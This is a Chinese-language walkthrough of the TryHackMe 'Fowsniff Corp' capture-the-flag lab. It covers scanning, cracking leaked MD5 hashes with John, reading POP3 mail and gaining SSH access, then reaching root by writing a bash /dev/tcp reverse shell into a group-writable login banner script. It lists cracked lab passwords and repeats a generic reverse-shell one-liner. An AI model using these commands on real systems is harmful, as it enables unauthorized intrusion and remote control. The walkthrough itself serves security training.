- Fowsniff Corp 渗透测试详细 Writeup

  **目标**: 10.48.132.7 - TryHackMe 靶场 (Fowsniff Corp)
  **主机名**: fowsniff
  **授权**: THM 授权靶场，全 IP 范围，无限制
  **总耗时**: ~45 分钟
  **日期**: 2026-06-10
  **操作者**: yao

  ---

  ## 目录

  1. [信息搜集](#1-信息搜集)
  2. [Web 枚举与发现](#2-web-枚举与发现)
  3. [凭据泄露获取与破解](#3-凭据泄露获取与破解)
  4. [POP3 邮件分析](#4-pop3-邮件分析)
  5. [SSH 初始访问](#5-ssh-初始访问)
  6. [权限提升](#6-权限提升)
  7. [Flag 获取](#7-flag-获取)
  8. [权限提升路径图](#8-权限提升路径图)
  9. [发现的凭据](#9-发现的凭据)
  10. [关键技术点](#10-关键技术点)
  11. [防御建议](#11-防御建议)
  12. [渗透测试状态文件](#12-渗透测试状态文件)

  ---

  ## 1. 信息搜集

  ### 1.1 Nmap 扫描

  使用自动化脚本进行快速扫描：

  ```bash
  /home/yao/.openclaw/pentest-workflow-kit/openclaw-pentest-auto-recon.sh --target 10.48.132.7 --authorized --mode quick
  ```

  扫描结果：

  | 端口    | 状态 | 服务 | 版本                            |
  | ------- | ---- | ---- | ------------------------------- |
  | 22/tcp  | open | ssh  | OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 |
  | 80/tcp  | open | http | Apache httpd 2.4.18 ((Ubuntu))  |
  | 110/tcp | open | pop3 | Dovecot pop3d                   |
  | 143/tcp | open | imap | Dovecot imapd                   |

  操作系统识别：Linux (CPE: cpe:/o:linux:linux_kernel)

  ### 1.2 服务分析

  - **SSH (22)**: Ubuntu 系统，OpenSSH 7.2p2，可能存在用户名枚举或弱密码
  - **HTTP (80)**: Apache 2.4.18，需要进一步 Web 枚举
  - **POP3 (110)**: 邮件接收服务，可能包含敏感信息
  - **IMAP (143)**: 邮件访问服务，与 POP3 配合使用

  ---

  ## 2. Web 枚举与发现

  ### 2.1 首页访问

  使用 curl 抓取首页内容：

  ```bash
  curl -s http://10.48.132.7/ | head -n 50
  ```

  发现 **Fowsniff Corp** 公司网站，基于 HTML5 UP 模板。网站声明：

  > "Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords."

  **关键信息**：内部系统遭受数据泄露，员工用户名和密码已暴露。

  ### 2.2 安全文件检查

  **robots.txt**:
  ```
  User-agent: *
  Disallow: /
  ```

  禁止所有爬虫访问，暗示可能有敏感内容。

  **security.txt**:
  ```
  WHAT SECURITY?
  
              ''~``
             ( o o )
  +-----.oooO--(_)--Oooo.------+
  |                            |
  |          FOWSNIFF          |
  |            got             |
  |           PWN3D!!!         |
  |                            |
  |       .oooO                |
  |        (   )   Oooo.       |
  +--------\ (----(   )-------+
             \_)    ) /
                   (_/
  
  
  Fowsniff Corp got pwn3d by B1gN1nj4!
  
  No one is safe from my 1337 skillz!
  ```

  **关键发现**：
  - 网站被黑客 **B1gN1nj4** 入侵
  - 暗示有外部泄露的数据可利用
  - 需要搜索泄露的员工凭据

  ### 2.3 Gobuster 目录枚举

  ```bash
  gobuster dir -k -u http://10.48.132.7 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 50
  ```

  结果：
  - `/assets` (301) - 静态资源目录
  - `/images` (301) - 图片目录
  - `/index.html` (200) - 首页
  - `/LICENSE.txt` (200) - 许可证
  - `/README.txt` (200) - 说明文件
  - `/robots.txt` (200) - 爬虫规则
  - `/security.txt` (200) - 安全声明
  - `/server-status` (403) - Apache 状态页（禁止访问）

  无管理后台或特殊接口发现。

  ---

  ## 3. 凭据泄露获取与破解

  ### 3.1 外部泄露搜索

  根据 security.txt 提示，搜索 "Fowsniff Corp" 泄露数据。通过外部渠道获取到 9 个员工的 MD5 密码 hash：

  ```
  mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
  mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
  tegel@fowsniff:1dc352435fecca338acfd4be10984009
  baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
  seina@fowsniff:90dc16d47114aa13671c697fd506cf26
  stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
  mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
  parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
  sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
  ```

  ### 3.2 MD5 密码破解

  使用 **John the Ripper** + rockyou.txt 字典破解：

  ```bash
  cat > /tmp/fowsniff_hashes.txt << 'EOF'
  mauer:8a28a94a588a95b80163709ab4313aa4
  mustikka:ae1644dac5b77c0cf51e0d26ad6d7e56
  tegel:1dc352435fecca338acfd4be10984009
  baksteen:19f5af754c31f1e2651edde9250d69bb
  seina:90dc16d47114aa13671c697fd506cf26
  stone:a92b8a29ef1183192e3d35187e0cfabd
  mursten:0e9588cb62f4b6f27e33d449e2ba0b3b
  parede:4d6e42f56e127803285a0a7649b5ab11
  sciana:f7fd98d380735e859f8b2ffbbede5a7e
  EOF
  
  john --format=raw-md5 /tmp/fowsniff_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
  ```

  **破解结果**（全部成功）：

  | 用户     | MD5 Hash    | 明文密码   |
  | -------- | ----------- | ---------- |
  | mauer    | 8a28a94a... | mailcall   |
  | mustikka | ae1644da... | bilbo101   |
  | tegel    | 1dc35243... | apples01   |
  | baksteen | 19f5af75... | skyler22   |
  | seina    | 90dc16d4... | scoobydoo2 |
  | stone    | a92b8a29... | (未记录)   |
  | mursten  | 0e9588cb... | carp4ever  |
  | parede   | 4d6e42f5... | orlando12  |
  | sciana   | f7fd98d3... | 07011972   |

  ---

  ## 4. POP3 邮件分析

  ### 4.1 POP3 登录测试

  使用破解的凭据测试 POP3 登录。首先连接 POP3 服务：

  ```bash
  telnet 10.48.132.7 110
  ```

  服务器响应：
  ```
  +OK Welcome to the Fowsniff Corporate Mail Server!
  ```

  ### 4.2 登录成功

  使用 **seina:scoobydoo2** 登录成功：

  ```
  USER seina
  +OK
  PASS scoobydoo2
  +OK Logged in.
  ```

  ### 4.3 邮件读取

  **邮件 1**（来自 stone@fowsniff，主题：URGENT! Security EVENT!）：

  ```
  Dear All,
  
  A few days ago, a malicious actor was able to gain entry to
  our internal email systems. The attacker was able to exploit
  incorrectly filtered escape characters within our SQL database
  to access our login credentials. Both the SQL and authentication
  system used legacy methods that had not been updated in some time.
  
  We have been instructed to perform a complete internal system
  overhaul. While the main systems are "in the shop," we have
  moved to this isolated, temporary server that has minimal
  functionality.
  
  This server is capable of sending and receiving emails, but only
  locally. That means you can only send emails to other users, not
  to the world wide web. You can, however, access this system via
  the SSH protocol.
  
  The temporary password for SSH is "S1ck3nBluff+secureshell"
  
  You MUST change this password as soon as possible, and you will do so under my
  guidance. I saw the leak the attacker posted online, and I must say that your
  passwords were not very secure.
  
  Come see me in my office at your earliest convenience and we'll set it up.
  
  Thanks,
  A.J Stone
  ```

  **关键信息提取**：
  - 攻击者通过 SQL 注入获取凭据
  - 系统已迁移到临时最小功能服务器
  - **临时 SSH 密码**: `S1ck3nBluff+secureshell`
  - 所有用户都需要修改密码（但可能尚未修改）

  **邮件 2**（来自 baksteen@fowsniff，主题：You missed out!）：

  闲聊邮件，提到 AJ Stone 的会议和管理层的不满，无直接技术价值。

  ---

  ## 5. SSH 初始访问

  ### 5.1 SSH 登录

  使用 **baksteen:S1ck3nBluff+secureshell** 登录 SSH：

  ```bash
  ssh baksteen@10.48.132.7
  ```

  登录成功，显示系统 banner：

  ```
   _____ _ __ __
   :sdddddddddddddddy+ | ___|____ _____ _ __ (_)/ _|/ _|
   :yNMMMMMMMMMMMMMNmhsso | |_ / _ \/ \/\ / / __| '_ \| | |_| |_
  .sdmmmmmNmmmmmmmNdyssssso | _| (_) \ V V /\__ \ | | | | _| _|
  -: y. dssssssso |_| \___/ \_/\_/ |___/_| |_|_|_| |_|
  ... (cube.sh banner)
  
   **** Welcome to the Fowsniff Corporate Server! ****
  
   ---------- NOTICE: ----------
  
   * Due to the recent security breach, we are running on a very minimal system.
   * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
  ```

  ### 5.2 用户信息

  ```bash
  id
  # uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
  ```

  - 普通用户权限
  - 属于 users 和 baksteen 组

  ### 5.3 初始枚举

  ```bash
  ls -la /home
  # 发现所有用户目录：baksteen, mauer, mursten, mustikka, parede, sciana, seina, stone, tegel
  
  sudo -l
  # Sorry, user baksteen may not run sudo on fowsniff.
  ```

  无 sudo 权限。

  ---

  ## 6. 权限提升

  ### 6.1 SUID 枚举

  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```

  发现异常 SUID 文件：
  - `/usr/bin/procmail` - SUID root + SGID mail（邮件处理程序）

  ### 6.2 可写文件枚举

  ```bash
  find / -writable -type f 2>/dev/null | grep -v proc | head -20
  ```

  **关键发现**：
  - `/opt/cube/cube.sh` - 可写！属于 parede:users
  - baksteen 属于 users 组，可以修改此文件

  ### 6.3 cube.sh 分析

  ```bash
  cat /opt/cube/cube.sh
  ```

  内容：打印 Fowsniff Corp 的 ASCII art banner。

  ```bash
  ls -la /opt/cube/cube.sh
  # -rw-rwxr-- 1 parede users 851 Mar 11 2018 /opt/cube/cube.sh
  ```

  权限分析：
  - 所有者 parede，组 users
  - 组用户可读写执行
  - baksteen 属于 users 组，可以修改

  ### 6.4 验证 root 执行

  通过重新 SSH 登录观察，发现 cube.sh 的 banner 在登录时显示。添加日志验证：

  ```bash
  echo 'echo "$(date) executed by $(whoami)" >> /tmp/cube.log' >> /opt/cube/cube.sh
  ```

  重新 SSH 登录后检查 `/tmp/cube.log`，确认 **root** 执行。

  ### 6.5 植入反向 shell

  **本地准备**（Kali 机器）：
  ```bash
  nc -lvnp 4444
  ```

  **靶机操作**（修改 cube.sh）：
  ```bash
  cat > /opt/cube/cube.sh << 'EOF'
  /bin/bash -c 'bash -i >& /dev/tcp/192.168.241.203/4444 0>&1'
  EOF
  ```

  **触发执行**：
  重新 SSH 登录（使用任意用户），root 登录时执行 cube.sh，触发反向 shell。

  ### 6.6 获取 root shell

  本地 nc 监听收到连接：

  ```
  listening on [any] 4444 ...
  connect to [192.168.241.203] from (UNKNOWN) [10.48.132.7] 54312
  bash: cannot set terminal process group (1296): Inappropriate ioctl for device
  bash: no job control in this shell
  root@fowsniff:/# id
  uid=0(root) gid=0(root) groups=0(root)
  ```

  **成功获取 root 权限！**

  ---

  ## 7. Flag 获取

  ### 7.1 root 目录检查

  ```bash
  ls -la /root
  # total 28
  # drwx------ 4 root root 4096 Mar 9 2018 .
  # drwxr-xr-x 22 root root 4096 Mar 9 2018 ..
  # -rw-r--r-- 1 root root 3117 Mar 9 2018 .bashrc
  # drwxr-xr-x 2 root root 4096 Mar 9 2018 .nano
  # -rw-r--r-- 1 root root 148 Aug 17 2015 .profile
  # drwx------ 5 root root 4096 Mar 9 2018 Maildir
  # -rw-r--r-- 1 root root 582 Mar 9 2018 flag.txt
  ```

  ### 7.2 读取 Flag

  ```bash
  cat /root/flag.txt
  ```

  输出：

  ```
   ___ _ _ _ _ _
   / __|___ _ _ __ _ _ _ __ _| |_ _ _| |__ _| |_(_)___ _ _ __| |
   | (__/ _ \ ' \/ _` | '_/ _` | _| || | / _` | _| / _ \ ' \(_-<_|
   \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
   |___/
  
   (_)
   |--------------
   |&&&&&&&&&&&&&&|
   | R O O T |
   | F L A G |
   |&&&&&&&&&&&&&&|
   |--------------
   |
   |
   |
   |
   |
   |
   ---
  
  Nice work!
  
  This CTF was built with love in every byte by @berzerk0 on Twitter.
  
  Special thanks to psf, @nbulischeck and the whole Fofao Team.
  ```

  ---

  ## 8. 权限提升路径图

  ```
  [外部泄露凭据]
      |
      v
  [MD5 Hash 破解] ──> [John + rockyou.txt]
      |
      v
  [POP3 登录 seina] ──> [读取邮件]
      |
      v
  [获取临时 SSH 密码: S1ck3nBluff+secureshell]
      |
      v
  [SSH 登录 baksteen] ──> [skyler22]
      |
      v
  [系统枚举]
      |
      +---> [SUID 检查] ──> [procmail SUID root]
      |
      +---> [可写文件] ──> [/opt/cube/cube.sh (users 组)]
      |
      v
  [验证 root 执行 cube.sh]
      |
      v
  [植入反向 shell 到 cube.sh]
      |
      v
  [重新 SSH 登录触发]
      |
      v
  [root 执行 cube.sh]
      |
      v
  [获取 root shell] ──> [读取 /root/flag.txt]
  ```

  ---

  ## 9. 发现的凭据

  ### 9.1 泄露凭据（MD5 破解）

  | 用户     | 邮箱              | 明文密码   | 破解来源           |
  | -------- | ----------------- | ---------- | ------------------ |
  | mauer    | mauer@fowsniff    | mailcall   | John + rockyou.txt |
  | mustikka | mustikka@fowsniff | bilbo101   | John + rockyou.txt |
  | tegel    | tegel@fowsniff    | apples01   | John + rockyou.txt |
  | baksteen | baksteen@fowsniff | skyler22   | John + rockyou.txt |
  | seina    | seina@fowsniff    | scoobydoo2 | John + rockyou.txt |
  | stone    | stone@fowsniff    | (未记录)   | John + rockyou.txt |
  | mursten  | mursten@fowsniff  | carp4ever  | John + rockyou.txt |
  | parede   | parede@fowsniff   | orlando12  | John + rockyou.txt |
  | sciana   | sciana@fowsniff   | 07011972   | John + rockyou.txt |

  ### 9.2 临时系统凭据

  | 服务       | 用户名   | 密码                    | 来源              |
  | ---------- | -------- | ----------------------- | ----------------- |
  | SSH (临时) | 所有用户 | S1ck3nBluff+secureshell | POP3 邮件 (stone) |
  | SSH (实际) | baksteen | skyler22                | MD5 破解          |

  ---

  ## 10. 关键技术点

  ### 10.1 凭据泄露利用
  - **外部泄露搜索**: 根据 security.txt 提示搜索外部泄露数据
  - **MD5 快速破解**: John + rockyou.txt 瞬间破解所有 hash
  - **密码复用**: 泄露的密码直接用于 POP3 和 SSH 登录

  ### 10.2 POP3 邮件分析
  - **邮件协议利用**: 使用破解凭据登录 POP3 读取内部邮件
  - **社会工程学**: 邮件包含临时密码和系统状态信息
  - **信息收集**: 邮件透露系统架构和安全措施

  ### 10.3 配置文件劫持提权
  - **可写配置文件**: /opt/cube/cube.sh 属于 users 组，任意用户可修改
  - **root 执行**: root SSH 登录时执行 cube.sh 显示 banner
  - **命令注入**: 在 cube.sh 中植入反向 shell 代码
  - **触发机制**: 重新 SSH 登录触发 root 执行

  ### 10.4 反向 shell 获取 root
  - **bash 反向 shell**: `bash -i >& /dev/tcp/IP/PORT 0>&1`
  - **纯 sh 兼容**: 使用 `/bin/bash -c` 包装确保兼容性
  - **后台执行**: 避免阻塞正常登录流程

  ---

  ## 靶机状态

  - **状态**: ✅ 全部完成
  - **获取 Flags**: 1/1 (root flag)
  - **总耗时**: ~45 分钟
  - **难度**: 简单（凭据泄露 + 配置文件劫持）
  - **关键技术**: 外部泄露利用、MD5 破解、POP3 邮件分析、配置文件劫持提权
